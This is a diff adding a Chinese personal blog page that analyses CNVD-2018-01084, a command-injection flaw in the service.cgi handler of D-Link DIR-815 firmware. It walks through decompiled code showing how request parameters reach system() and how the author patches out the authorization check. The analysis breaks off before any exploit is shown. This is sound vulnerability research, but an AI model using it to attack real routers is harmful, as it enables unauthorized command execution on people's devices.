@@ -1,0 +1,292 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CNVD-2018-01084 | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CNVD-2018-01084官方报告：cnvd.org.cn&#x2F;flaw&#x2F;show&#x2F;CNVD-2018-01084 固件：下载 固件提取部分就不阐述了，接下来直接看静态分析。 一.逆向分析123456if ( !strcmp(v3, &quot;service.cgi&quot;) )  &amp;#123;    phpcgi_main_1 &#x3D; servicecgi_mai">
+<meta property="og:type" content="website">
+<meta property="og:title" content="CNVD-2018-01084">
+<meta property="og:url" content="http://example.com/2026/08/05/CNVD-2018-01084/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="CNVD-2018-01084官方报告：cnvd.org.cn&#x2F;flaw&#x2F;show&#x2F;CNVD-2018-01084 固件：下载 固件提取部分就不阐述了，接下来直接看静态分析。 一.逆向分析123456if ( !strcmp(v3, &quot;service.cgi&quot;) )  &amp;#123;    phpcgi_main_1 &#x3D; servicecgi_mai">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-08-04T16:50:30.000Z">
+<meta property="article:modified_time" content="2026-08-05T09:55:05.146Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/08/05/CNVD-2018-01084/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CNVD-2018-01084',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">CNVD-2018-01084</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CNVD-2018-01084"><a href="#CNVD-2018-01084" class="headerlink" title="CNVD-2018-01084"></a>CNVD-2018-01084</h1><p>官方报告：<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">cnvd.org.cn&#x2F;flaw&#x2F;show&#x2F;CNVD-2018-01084</a></p>
+<p>固件：<a target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">下载</a></p>
+<p>固件提取部分就不阐述了，接下来直接看静态分析。</p>
+<h2 id="一-逆向分析"><a href="#一-逆向分析" class="headerlink" title="一.逆向分析"></a>一.逆向分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;service.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    phpcgi_main_1 = servicecgi_main;</span><br><span class="line">    argc_1 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))phpcgi_main_1)(argc_1, argv, envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据报告，我们先找到这个<code>service.cgi</code>，然后看<code>servicecgi_main</code>函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">servicecgi_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> n1024; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *Unable_to_parse_HTTP_request; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *V9; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *FAILED; <span class="comment">// $a1</span></span><br><span class="line">  _DWORD *v11; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">void</span> *ptr_1; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">260</span>]; <span class="comment">// [sp+18h] [-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">  v0 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v0, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      n1024 = <span class="number">1024</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(v1, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(s, <span class="number">0x100u</span>, <span class="string">&quot;Unsupport HTTP request - %s&quot;</span>, v1);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">      n1024 = <span class="number">64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = cgibin_parse_request(sub_40A63C, <span class="number">0</span>, n1024);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Unable_to_parse_HTTP_request = <span class="string">&quot;Unable to parse HTTP request&quot;</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x100u</span>, Unable_to_parse_HTTP_request);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      Unable_to_parse_HTTP_request = <span class="string">&quot;Not authorized&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = sub_40A1C0(<span class="string">&quot;EVENT&quot;</span>);</span><br><span class="line">    v8 = (<span class="type">const</span> <span class="type">char</span> *)sub_40A1C0(<span class="string">&quot;ACTION&quot;</span>);</span><br><span class="line">    v7 = sub_40A1C0(<span class="string">&quot;SERVICE&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      V9 = <span class="string">&quot;event %s &gt; /dev/null&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v7 || !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v8, <span class="string">&quot;START&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        V9 = <span class="string">&quot;service %s start &gt; /dev/null&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !strcasecmp(v8, <span class="string">&quot;STOP&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        V9 = <span class="string">&quot;service %s stop &gt; /dev/null&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( strcasecmp(v8, <span class="string">&quot;RESTART&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">snprintf</span>(s, <span class="number">0x100u</span>, <span class="string">&quot;Unknown action - &#x27;%s&#x27;&quot;</span>, v8);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        &#125;</span><br><span class="line">        V9 = <span class="string">&quot;service %s restart &gt; /dev/null&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    lxmldbc_system(V9);</span><br><span class="line">LABEL_27:</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x100u</span>, <span class="string">&quot;No HTTP request&quot;</span>);</span><br><span class="line">LABEL_10:</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">LABEL_28:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;report&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    FAILED = <span class="string">&quot;FAILED&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    FAILED = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t&lt;result&gt;%s&lt;/result&gt;\n&quot;</span>, FAILED);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t&lt;message&gt;%s&lt;/message&gt;\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;/report&gt;&quot;</span>);</span><br><span class="line">  cgibin_clean_tempfiles();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = ptr_0;</span><br><span class="line">    result = v4;</span><br><span class="line">    <span class="keyword">if</span> ( ptr_0 == (_UNKNOWN *)&amp;ptr_0 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v11 = (_DWORD *)*((_DWORD *)ptr_0 + <span class="number">1</span>);</span><br><span class="line">    v12 = *(_DWORD *)ptr_0;</span><br><span class="line">    ptr_1 = (<span class="type">void</span> *)*((_DWORD *)ptr_0 + <span class="number">2</span>);</span><br><span class="line">    *v11 = *(_DWORD *)ptr_0;</span><br><span class="line">    *(_DWORD *)(v12 + <span class="number">4</span>) = v11;</span><br><span class="line">    *(_DWORD *)ptr = <span class="number">0</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ptr_1 )</span><br><span class="line">      <span class="built_in">free</span>(ptr_1);</span><br><span class="line">    <span class="keyword">if</span> ( *((_DWORD *)ptr + <span class="number">3</span>) )</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)ptr + <span class="number">3</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/cve2-1.png" alt="ida"></p>
+<p>我们猜测这里的漏洞在于<code>system</code>函数，是由<code>lxmldbc_system</code>调用的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lxmldbc_system</span><span class="params">(<span class="type">char</span> *format, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1028</span>]; <span class="comment">// [sp+1Ch] [-404h] BYREF</span></span><br><span class="line">  va_list va; <span class="comment">// [sp+42Ch] [+Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, format);</span><br><span class="line">  vsnprintf(s, <span class="number">0x400u</span>, format, va);</span><br><span class="line">  <span class="keyword">return</span> system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会进行一个格式化字符串的拼接，然后把拼接好的字符串作为<code>system</code>函数的参数调用，所以，这里存在一个可以被利用的点。</p>
+<p>我们看这里的<code>servicecgi_main</code>的流程。</p>
+<p>获取环境变量<code>REQUEST_METHOD</code>进行判断，当请求头为<code>GET</code>的时候，会跳转到<code>LABEL_10</code>，但是这里的<code>LABEL_10</code>是在<code>lxmldbc_system</code>函数下面的，所以，我们这里的请求头必须是<code>POST</code></p>
+<p>然后会进入到<code>cgibin_parse_request</code>。这个函数这里就不多分析了，之前在<code>CNVD-2013-11625-BIR-815</code>那篇文章分析过了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sess_ispoweruser() )</span><br><span class="line">    &#123;</span><br><span class="line">      Unable_to_parse_HTTP_request = <span class="string">&quot;Not authorized&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要绕过这里的判断，也就是<code>sess_ispoweruser</code>返回值为非0。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">sess_ispoweruser</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n100; <span class="comment">// $v0</span></span><br><span class="line">  _BOOL4 v1; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  n100 = sess_validate();</span><br><span class="line">  v1 = n100 &lt; <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n100 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在进入<code>sess_validate</code>函数后，又会触发<code>sess_get_uid</code>，这里也不过多分析了。</p>
+<p>但是，由于在进入<code>sess_ispoweruser</code>这个函数后，会打开一些文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v3 = xs_fopen(<span class="string">&quot;/var/session/sesscfg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">result = sobj_new();</span><br><span class="line">v4 = result;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%s/%d&quot;</span>, <span class="string">&quot;/var/session&quot;</span>, a2);</span><br></pre></td></tr></table></figure>
+
+<p>所以这里我们选择直接把<code>sess_ispoweruser</code>给<code>patch</code>掉。即把跳转指令改为nop指令。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      Unable_to_parse_HTTP_request = <span class="string">&quot;Not authorized&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = sub_40A1C0(<span class="string">&quot;EVENT&quot;</span>);</span><br><span class="line">    v8 = (<span class="type">const</span> <span class="type">char</span> *)sub_40A1C0(<span class="string">&quot;ACTION&quot;</span>);</span><br><span class="line">    v7 = sub_40A1C0(<span class="string">&quot;SERVICE&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      V9 = <span class="string">&quot;event %s &gt; /dev/null&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v7 || !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v8, <span class="string">&quot;START&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        V9 = <span class="string">&quot;service %s start &gt; /dev/null&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !strcasecmp(v8, <span class="string">&quot;STOP&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        V9 = <span class="string">&quot;service %s stop &gt; /dev/null&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( strcasecmp(v8, <span class="string">&quot;RESTART&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">snprintf</span>(s, <span class="number">0x100u</span>, <span class="string">&quot;Unknown action - &#x27;%s&#x27;&quot;</span>, v8);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        &#125;</span><br><span class="line">        V9 = <span class="string">&quot;service %s restart &gt; /dev/null&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    lxmldbc_system(V9);</span><br></pre></td></tr></table></figure>
+
+<p>然后接下来这一部分会先进入<code>sub_40a1c0</code>，这里很明显，如果<code>v6!=0</code>，那么这条分支最简单。不然接下来的else分支会比较复杂。</p>
+<p>然后我们进<code>sub_40a1c0</code>看看。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_40A1C0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// $s1</span></span><br><span class="line">  _UNKNOWN **v3; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  ptr = ptr_0;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (_UNKNOWN **)(v3 ? *v3 : ptr);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == &amp;ptr_0 || !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)v3[<span class="number">2</span>]) )</span><br><span class="line">      <span class="keyword">return</span> v3[<span class="number">3</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会发现，这里的<code>a1</code>就是传进去的<code>EVENT / ACTION / SERVICE</code>这些参数，后面的<code>v3[2]</code>就应该是用户可控的一个字符串，不过这里静态分析不太好看出来。</p>
+<p>同理，在<code>lxmldbc_system</code>中，之前拼接的参数也不知道存在内存中的哪里(<code>va</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lxmldbc_system</span><span class="params">(<span class="type">char</span> *format, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1028</span>]; <span class="comment">// [sp+1Ch] [-404h] BYREF</span></span><br><span class="line">  va_list va; <span class="comment">// [sp+42Ch] [+Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, format);</span><br><span class="line">  vsnprintf(s, <span class="number">0x400u</span>, format, va);</span><br><span class="line">  <span class="keyword">return</span> system(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
